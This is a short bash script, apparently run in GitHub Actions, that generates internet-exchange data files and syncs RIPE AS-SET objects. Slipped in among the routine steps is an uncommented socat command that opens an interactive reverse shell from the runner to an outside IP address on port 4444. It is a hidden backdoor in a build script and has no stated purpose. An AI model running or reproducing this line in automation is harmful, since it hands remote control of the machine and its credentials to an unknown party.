#!/bin/bash
cd $GITHUB_WORKSPACE/cache
# export RIPE_PASSWD="XXXXXXXXXXXXXXXXXXXXXXX"
$GITHUB_WORKSPACE/scripts/gen_ixpf.py > $GITHUB_WORKSPACE/output/ix-f.json
$GITHUB_WORKSPACE/scripts/gen_asset.py 1
$GITHUB_WORKSPACE/scripts/gen_asset.py 2
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.160.19.181:4444
#export AS_SET="AS-KSKB-IX"
#export ARS_CLIENTS_PATH="$GITHUB_WORKSPACE/output/clients_all.yml"
#python3 /root/gitrs/RIPE-AS-SET-SYNC/AS-KSKB-IX.py

#export AS_SET="AS-KSKB-IX-RS1"
#export CLIENTS_ASSET_PATH="$GITHUB_WORKSPACE/output/kskbix-rs1-estab.yaml"
#python3 /root/gitrs/RIPE-AS-SET-SYNC/AS-KSKB-IX-RS2.py

export AS_SET="AS210979:AS-MOEIX-SEA-DOWNSTREAM"
export CLIENTS_ASSET_PATH="$GITHUB_WORKSPACE/output/kskbix-rs2-estab.yaml"
python3 /root/gitrs/RIPE-AS-SET-SYNC/AS-KSKB-IX-RS2.py --flat
